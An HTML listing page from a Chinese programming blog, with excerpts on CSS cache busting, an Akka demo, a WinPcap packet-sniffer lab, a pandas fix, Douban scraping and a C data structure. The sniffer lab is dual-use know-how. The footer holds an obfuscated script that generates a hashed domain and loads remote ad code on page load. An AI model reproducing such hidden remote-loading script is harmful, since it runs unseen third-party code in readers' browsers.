		浏览器缓存CSS将带来主要的性能提升。 您确保服务器设置为发送标头，这些标头告诉浏览器在给定的时间内挂接到CSS文件。 最好的做法是，即使不是大多数站点，许多站点已经在这样做。 与浏览器缓存紧密结合的是缓存清除 。 假设浏览器将CSS文件缓存了一年（这并不罕见）。 然后，您想更改CSS。 您需要一种策略来打破缓存并强制浏览器下载CSS的新副本。 这里有一些方法。 CSS必须缓存起来才有意义…… 为了确保这一点，这是缓存CSS文件的一些看起来不错的标头： 我们正在寻找那个Cache-Control and Expires标头。 我不是服务器配置专家。 我可能会看一下H5BP服务器配置。 但是，这里有一些经典的Apache / HTAccess方法来实现： &lt;FilesMatch "\.(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)(\.gz)?$"&gt; Header set Expires "Thu, 15 Apr 2020 20:00:00 GMT" &lt;/FilesMatch&gt; &lt;IfModule mod_expires.c&gt; ExpiresActive on ExpiresByType text/css "access plus 1 year" ExpiresByType application/javascript "access plus 1 year" &lt;/IfModule&gt; 查询字串 如今，大多数浏览器会看到带有不同查询字符串的URL作为不同文件，并下载新副本。 大多数CDN甚至都支持并建议这样做。 &lt;link rel="stylesheet" href="style.css?v=3.4.1"&gt; 零钱吗？ 更改为： &lt;link rel="stylesheet" href="style.css?v=3.4.2"&gt; 通过将服务器端变量设置为可在多个位置使用，可以使自己更容易。 因此，对其进行更改将立即破坏许多文件的缓存。 &lt;?php $cssVersion = "3.4.2"; ?&gt; &lt;link rel="stylesheet" href="global.css?v=&lt;?php echo $cssVersion; ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5c2a17aa35a0d7a51cdfb3930c00c52/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de20e4aca5ea7ec912bcf24f94465c83/" rel="bookmark">
			Akka并发编程-Akka特性，并实现两个进程之间的通信（含完整Demo）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Akka介绍 Akka是一个用于构建高并发、分布式和可扩展的基于事件驱动的应用的工具包。Akka是使用scala开发的库，同时可以使用scala和Java语言来开发基于Akka的应用程序。
Akka特性 提供基于异步非阻塞、高性能的事件驱动编程模型内置容错机制，允许Actor在出错时进行恢复或者重置操作超级轻量级的事件处理（每GB堆内存几百万Actor）使用Akka可以在单机上构建高并发程序，也可以在网络中构建分布式程序。 Akka通信过程 以下图片说明了Akka Actor的并发编程模型的基本流程：
学生创建一个ActorSystem通过ActorSystem来创建一个ActorRef（老师的引用），并将消息发送给ActorRefActorRef将消息发送给Message Dispatcher（消息分发器）Message Dispatcher将消息按照顺序保存到目标Actor的MailBox中Message Dispatcher将MailBox放到一个线程中MailBox按照顺序取出消息，最终将它递给TeacherActor接受的方法中 入门Demo 基于Akka创建两个Actor，Actor之间可以互相发送消息。
实现步骤 创建Maven模块创建并加载Actor发送/接收消息 1. 创建Maven模块 使用Akka需要导入Akka库，我们这里使用Maven来管理项目
创建Maven模块打开pom.xml文件，导入akka Maven依赖和插件 2. 创建并加载Actor 创建两个Actor
SenderActor：用来发送消息ReceiveActor：用来接收，回复消息 创建Actor
创建ActorSystem创建自定义ActorActorSystem加载Actor 3. 发送/接收消息 使用样例类封装消息SubmitTaskMessage——提交任务消息SuccessSubmitTaskMessage——任务提交成功消息使用类似于之前学习的Actor方式，使用!发送异步消息 完整代码：
pom.xml
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.akka&lt;/groupId&gt; &lt;artifactId&gt;akkatest2&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;scala.version&gt;2.11.8&lt;/scala.version&gt; &lt;scala.compat.version&gt;2.11&lt;/scala.compat.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.scala-lang&lt;/groupId&gt; &lt;artifactId&gt;scala-library&lt;/artifactId&gt; &lt;version&gt;${scala.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.typesafe.akka&lt;/groupId&gt; &lt;artifactId&gt;akka-actor_2.11&lt;/artifactId&gt; &lt;version&gt;2.3.14&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.typesafe.akka&lt;/groupId&gt; &lt;artifactId&gt;akka-remote_2.11&lt;/artifactId&gt; &lt;version&gt;2.3.14&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;sourceDirectory&gt;src/main/scala&lt;/sourceDirectory&gt; &lt;testSourceDirectory&gt;src/test/scala&lt;/testSourceDirectory&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;net.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de20e4aca5ea7ec912bcf24f94465c83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75b2053f1d18cf38a5ec62134bfb24fe/" rel="bookmark">
			网络嗅探器设计实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实验环境： （1）Windows 10 系统平台；
（2）在VS环境下进行C++编程。
二、课程目的： （1）参照有关书籍，掌握有关网络通信基本原理；
（2）学习网络嗅探器的概念及其工作原理；
（3）掌握嗅探器的程序设计。
三、基本原理： 网络嗅探器又称为网络监听器，简称为Sniffer子系统，放置于网络节点处，对网络中的数据帧进行捕获的一种被动监听手段，是一种常用的收集有用数据的方法，这些数据可以是用户的账号和密码，可以是一些商用机密数据等等。Sniffer是利用计算机的网络接口截获目的地为其他计算机的数据报文的一种工具。Sniffer的正当用处主要是分析网络的流量，以便找出所关心的网络中潜在的问题。嗅探器可以理解为一个安装在计算机上的窃听设备它可以用来窃听计算机在网络上所产生的众多的信息。计算机直接所传送的数据，事实上是大量的二进制数据。因此一个网络窃听程序必须也使用特定的网络协议来分解嗅探到的数据，嗅探器也就必须能够识别出那个协议对应于这个数据片断，只有这样才能够进行正确的解码。很多计算机网络采用的是“共享媒体"，几乎可以在任何连接着的网络上直接窃听到你同一掩码范围内的计算机网络数据，我们称这种窃听方式为“基于混杂模式的嗅探”。尽管如此，这种“共享”的技术发展的很快，慢慢转向“交换”技术，这种技术会长期内会继续使用下去，它可以实现有目的选择的收发数据。在网络嗅探技术中所使用的包捕获机制的方法，大致可归纳为两类：一类是由操作系统内核提供的捕获机制；另一类是由应用软件或系统开发包通过安装包捕获驱动程序提供的捕获机制，该机制主要用于Win32平台下的开发。操作系统提供的捕获机制主要有四种：BPF，DLPI，NIT, Sock Packet类型套接口。BPF由基于BSD的Unix系统内核所实现；DLPI是Solaris(和其它System V Unix)系统的内嵌子系统。从性能上看，Sock Packet最弱。Windows操作系统没有提供内置的包捕获机制。它只提供了数量很少并且功能有限的API调用。WinPcap是Win32上的第一个用来捕获数据包的开放系统软件包，它是一种新提出的强有力并且可扩展的框架结构。以太网的数据传输是基于“共享”原理的，所有的同一本地网范围内的计算机共同接收到相同的数据包。这意味着计算机直接的通讯都是透明可见的。正是因为这样的原因，以太网卡都构造了硬件的“过滤器”这个过滤器将忽略掉一切和自己无关的网络信息。事实上是忽略掉了与自身MAC地址不符合的信息。嗅探程序正是利用了这个特点，它主动的关闭了这个嗅探器，也就是前面提到的设置网卡“混杂模式”。因此，嗅探程序就能够接收到整个以太网内的网络数据信息。 四、方法概述： 嗅探器实质就是从网络上获取数据包的一种工具，它可以捕捉流经本地网卡的所有数据包。抓取网络数据包进行分析有很多用处，如分析网络是否有网络病毒等异常数据，通信协议的分析（数据链路层协议、TCP、IP、UDP，甚至各种应用层协议），敏感数据的捕捉等。
程序在执行过程中有两个核心算法设计，一是调用Winpcap函数库实现下层抓包，二是对抓到的包文进行分析。对于抓包算法过程的实现：
（1）初始化Winpcap开发库；
（2）获取当前的网卡列表，同时要求用户指定要操作的网卡；
（3）获得当前的过滤规则；
（4）调用库函数pcap_loop()，同时指定其回调函数，即为数据包分析过程。本实验需要电脑上已经安装过winpcap，最主要的部分是数据包的解析与信息的获取。首先是配置使用pcap.h这个库，只需要在链接上加入wpcap.lib等几个相关联的动态库即可，其中拥有着功能更加强大的函数，现列举几个本嗅探器设计中所使用的函数于下：pcap_findalldevs_ex()函数用于获取当前主机的设备列表，使用者可以根据该函数给出的设备列表选定需要进行嗅探的设备究竟是哪一个，例如是以太网口还是无线网卡之类的设备。最后使用pcap_freealldevs()清空即可，否则会一直占用影响下次使用。pcap_open()函数则是另一个较为关键的函数，它主要用于打开与连接设备器，后面跟随的参数分别为：设备名 ；要捕捉的数据包的部分，往往用65535保证能捕获到不同数据链路层上的每个数据包的全部内容 ；‘PCAP_OPENFLAG_PROMISCUOUS’用作将其置于混杂模式 ； 读取超时时间 ；远程机器验证(NULL) ；错误缓冲池这几个参数，这也是确保嗅探器开始正确嗅探的一步。当嗅探器正确收集到数据包的时候则需要对数据包进行进一步的解析，以IP结构头为例，iphVerLen就代表了IP头中版本号和头长度（各占4位）的信息，ipSource与ipDestination则是我们所关心的源地址与目标地址信息，通过对获取到的数据包的结构体中这些信息的解析与输出，例如ip_hd-&gt;ipDestination便提取出了投中的目标地址，完成到了基本的嗅探操作，同时也可以获得数据包以数据或ASCII码等多种形式予以输出。Winpcap提供了pcap_findalldevs_ex()函数，这个函数返回一个指向pcap_if结构的链表，其中的每一项都包含了一个己经绑定的适配器的全部信息。取得网卡列表后就在屏幕上显示出来，如果网卡没有被发现就显示有关错误。pcap_ findalldevs()同其他的libpcap函数一样有一个errbuf参数，当有异常情况发生时，这个参数会被pcap填充为某个特定错误字串。随后，获得网卡的信息后就可以按数据捕获的要求打开网卡，打开网卡的功能是通过pcap_open_live()来实现的。在正常情况下网卡只接受去往它的包而去往其他主机的数据包则被忽略，相反当网卡处于混杂模式时它将接收所有的流经它的数据包。之后，使用pcap_next_ex()从网络接口中读取一个数据包，该函数第一个参数是接口句柄，后两个参数由函数返回，分别为数据包的相关信息和数据包本身。函数返回1表示正常接收一个数据包，每捕获到一个数据包就调用PacketHandler()函数对数据包进行后续解析处理。之后对捕获的数据包按照数据链路层、网络层、传输层和应用层的层次结构自底向上进行解析，最后将解析结果显示输出。 五、实验设计流程： 六、实验结果： 该实验使用了pcap.h这个库文件，实现了更加强大的监听功能，不仅能对TCP进行监听，亦可以对网络中流传的UDP协议通讯进行监听。运行程序后，首先检测2号网卡是否打开，经过监听一段时间发现并没有任何回应，即可说明该网卡端口并没有连接，详见下图：
随后输入网卡号3，同时输出获取的报文，且不对其输出长度做任何限制。这次成功监听到端口信息，详见下图：
七、代码： #define HAVE_REMOTE #define LINE_LEN 16 #include "winsock.h" #include &lt;string.h&gt; #include "pcap.h" /// typedef struct ip_address { //ip地址 u_char b1; u_char b2; u_char b3; u_char b4; } ip_address; typedef struct mac_address {//mac地址 u_char b1; u_char b2; u_char b3; u_char b4; u_char b5; u_char b6; } mac_address; typedef struct ethe_header { //mac帧首部 mac_address mac_dest_address; mac_address mac_source_address; u_short ether_type; } ethe_header; typedef struct ip_header { //ip地址首部 u_char ver_ihl; u_char tos; u_short tlen; u_short identification; u_short flags_fo; u_char ttl; u_char proto; u_short crc; ip_address saddr; ip_address daddr; u_int op_pad; } ip_header; typedef struct udp_header { //UPD首部 u_short sport; u_short dport; u_short len; u_short crc; } udp_header; typedef struct tcp_header { //TCP首部 u_short sport; u_short dport; u_int num; u_int ack; u_short sum; u_short windonw; u_short crc; u_short ugr; } tcp_header; void packet_handler(u_char * param, const struct pcap_pkthdr * header, const u_char *pkt_data); char judge; int length; int main() { pcap_if_t * alldevs, *device; int i = 0; int iNum; u_int netmask; struct bpf_program fcode; pcap_t * adhandle; char errbuf[PCAP_ERRBUF_SIZE]; //修改这里可以更改捕获的数据包使用的协议类型 char packet_filter[] = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75b2053f1d18cf38a5ec62134bfb24fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/392a579382a6b2b31f66f8ad822bad9e/" rel="bookmark">
			【Python问题】解决python的pandas使用to_excel()函数出现问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述 使用to_excel()函数报错为：got invalid value of type &lt;class ‘xml.etree.ElementTree.Element’&gt;, expected string or Element
原始代码 import pandas as pd test = pd.read_excel('原始数据.xlsx') print(test) data.to_excel("修改后数据.xlsx",index=False) 问题解决 在cmd终端或者pycharm的terminal终端执行安装openpyxl 3.0.0 版本
pip install openpyxl==3.0.0 -i https://pypi.douban.com/simple 原来的版本为3.0.2，可能是出现了bug。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b122d2125e2fd16136fdb4c9576c7e16/" rel="bookmark">
			使用requests爬取豆瓣电影
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用requests爬取豆瓣电影 一、分析 豆瓣电影信息https://movie.douban.com/explore#!type=movie&amp;tag=%E7%83%AD%E9%97%A8&amp;sort=recommend&amp;page_limit=20&amp;page_start=0
我们根据首页信信息获取链接
然后，点击进入二级链接
到了这个页面，我们就可以看到我们需要的信息了
接着，我们回到上个网页，查看一下我们需要爬取多少电影信息，可是当我们点击加载更多的时候，页面没有跳转，网页url也也有刷新，但是新的信息又出来了，根据经验，应该采用了异步刷新技术
通过我们对网页的分析，最终我获取的了数据加载的接口了，然后点进去，可以发现，这就是我们想要的数据。
然后我们通过对url的分析
https://movie.douban.com/j/search_subjects?type=movie&amp;tag=热门&amp;sort=recommend&amp;page_limit=20&amp;page_start=0 page_limit=20 决定请求信息的数量page_start=0 决定请求的位置
更重要的是这里的数据都是json格式的数据，我们就可以省去页面解析的步骤了
二、写代码 1.导入对应的python库
from lxml import etree#用于对网页的数据解析 import requests#网页请求 import json#数据储存 2.构建一个网页请求方法
def requests_get(url): #伪装头部 headers ={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " "AppleWebKit/537.36 (KHTML, like Gecko) " "Chrome/54.0.2840.99 Safari/537.36" } #进行请求 r = requests.get(url,headers=headers) #进行编码设置 r.encoding = 'utf-8' #返回获取信息 return r 3.创建一个解析网页信息并返回电影链接
def get_mv_listurl(html): #初始化一个电影链接的列表 mvlist = [] #由于信息是一种json的字符串 jsondata = json.loads(html.text)['subjects'] for data in jsondata: mvlist.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b122d2125e2fd16136fdb4c9576c7e16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cd1c585ad8864a79158c2e3bb23fa9f/" rel="bookmark">
			数据结构（C语言） 抽象数据类型Triplet的表示和实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		抽象数据类型 抽象数据类型（abstract data type，ADT）是指一个数学模型以及定义在该模型上的一组操作，取决于其逻辑特性。可通过固有数据类型来表示和实现，利用处理器中已存在的数据类型来说明新的结构，用已经实现的操作来组合新的操作。
采用动态分配的顺序存储结构 typedef ElemType* Triplet;	//由InitTriplet分配3个元素存储空间 基本操作的函数原型说明 //----基本操作的函数原型说明---- Status InitTriplet(Triplet&amp; T, ElemType v1, ElemType v2, ElemType v3); //操作结果：构造了三元组T，元素e1,e2和e3分别被赋以参数v1,v2和v3的值。 Status DestroyTriplet(Triplet&amp; T); //操作结果：三元组T被销毁。 Status Get(Triplet T, int i, ElemType&amp; e); //初始条件：三元组T已存在，1&lt;=i&lt;=3。 //操作结果：用e返回T的i元的值 Status Put(Triplet&amp; T, int i, ElemType e); //初始条件：三元组T已存在，1&lt;=i&lt;=3。 //操作结果：改变T的第i元的值为e。 Status IsAscending(Triplet T); //初始条件：三元组T已存在。 //操作结果：如果T的3个元素按升序排列，则返回1，否则返回0。 Status IsDescending(Triplet T); //初始条件：三元组T已存在。 //操作结果：如果T的3个元素按降序排列，则返回1，否则返回0。 Status Max(Triplet T, ElemType&amp; e); //初始条件：三元组T已存在。 //操作结果：用e返回T的三个元素中的最大值。 Status Min(Triplet T, ElemType&amp; e); //初始条件：三元组T已存在。 //操作结果：用e返回T的三个元素中的最小值。 基本操作的实现 Status InitTriplet(Triplet&amp; T, ElemType v1, ElemType v2, ElemType v3) { T = (ElemType*)malloc(3 * sizeof(ElemType)); if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cd1c585ad8864a79158c2e3bb23fa9f/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/230/">«</a>
	<span class="pagination__item pagination__item--current">231/306</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/232/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>